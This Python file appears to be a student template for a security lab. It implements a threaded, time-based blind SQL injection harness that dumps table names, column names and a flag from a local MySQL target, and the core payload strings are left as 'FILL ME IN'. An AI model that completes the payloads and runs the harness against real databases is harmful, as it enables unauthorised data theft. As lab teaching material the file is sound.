from concurrent.futures import ThreadPoolExecutor
import requests, re, string

TARGET = 'http://127.0.0.1:1337/time-based'

def get_length(post_param:str, column_name: str, table_name: str, suffix: str = '') -> int:
    """
        Gets the length of the data that is being dumped

        Parameters:
            post_param: The name of the POST request parameter 
                        (use BurpSuite, inspect on your browser or read the HTML code to get this)
            column_name: The name of the column to dump from the table
            table_name: The name of the table to dump data from
            suffix: Any additional statements to append to the query

        Returns:
            The length for the data that is being dumped
    """

    ##
    # STUDENTS FILL IN THE FOLLOWING SQLI PAYLOAD BELOW
    # 
    # You need to use format with the keyword arguments column_name and
    # table_name to dump a specific column from a table. The suffix
    # keyword argument is WHERE statements. For checking the length of 
    # the dumped put in {test_len}.
    #
    # For blind and time based you will need to use the group_concat
    # function to combine all of the rows for the dumped column into a
    # single row.
    ##
    payload = "FILL ME IN {column_name} {table_name} {suffix} {test_len}".format(
        column_name=column_name,
        table_name=table_name,
        suffix=suffix,
        test_len='{test_len}'
    )

    test_len = 0
    while test_len < 1000:
        test_payload = payload.format(test_len=test_len)
        response = requests.post(TARGET, data={post_param: test_payload})
        if response.elapsed.total_seconds() > 3:
            return test_len
        test_len += 1

    raise Exception('Could not get length of dumped data or it is over 1000 characters long!')

def try_char(post_param: str, payload: str, index: int, char: str) -> tuple:
    response = requests.post(
        TARGET, data={post_param: payload.format(char=char, index=index)}
    )
    return (response.elapsed.total_seconds() > 3, char)

def exploit(post_param:str, column_name: str, table_name: str, suffix: str = '') -> list:
    """
        Exploits the Error-based SQLi vulnerability for the SQLi lab

        Parameters:
            post_param: The name of the POST request parameter 
                        (use BurpSuite, inspect on your browser or read the HTML code to get this)
            column_name: The name of the column to dump from the table
            table_name: The name of the table to dump data from
            suffix: Any additional statements to append to the query

        Returns:
            A list of the dumped values from the database.
    """

    total_len = get_length(post_param, column_name, table_name, suffix=suffix)

    ##
    # STUDENTS FILL IN THE FOLLOWING SQLI PAYLOAD BELOW
    # 
    # You need to use format with the keyword arguments column_name and
    # table_name to dump a specific column from a table. The suffix
    # keyword argument is WHERE statements. The {index} is for checking
    # the value of a char using the substring MySQL function. The {char}
    # is replaced with the character to check.
    #
    # For blind and time based you will need to use the group_concat
    # function to combine all of the rows for the dumped column into a
    # single row.
    #
    # Don't forget that string comparisons are CASE INSENSITVE and you
    # need to fix it.
    ##
    payload = "FILL ME IN {column_name} {table_name} {suffix} {index} {char}".format(
        column_name=column_name,
        table_name=table_name,
        index='{index}',
        char='{char}',
        suffix=suffix
    )

    possible_chars = string.printable
    possible_chars_len = len(possible_chars)
    dumped_value = ''
    with ThreadPoolExecutor(max_workers=20) as executor:
        for dumped_index in range(1, total_len+1):
            futures = executor.map(
                try_char,
                [post_param]*possible_chars_len,
                [payload]*possible_chars_len,
                [dumped_index]*possible_chars_len,
                possible_chars
            )

            for result in futures:
                found_char, char = result
                if found_char:
                    dumped_value = dumped_value + char
                    print(dumped_value)
                    break

    return sorted(dumped_value.split(','))    

def main():
    flag_table = exploit('time', 'table_name', 'information_schema.tables', suffix='WHERE table_schema = "vulndb"')[0]
    flag_column = exploit('time', 'column_name', 'information_schema.columns', suffix='WHERE table_name = "{}"'.format(flag_table))[0]
    flag = exploit('time', flag_column, flag_table)
    print("Flag: " + flag[0])

if __name__ == "__main__":
    main()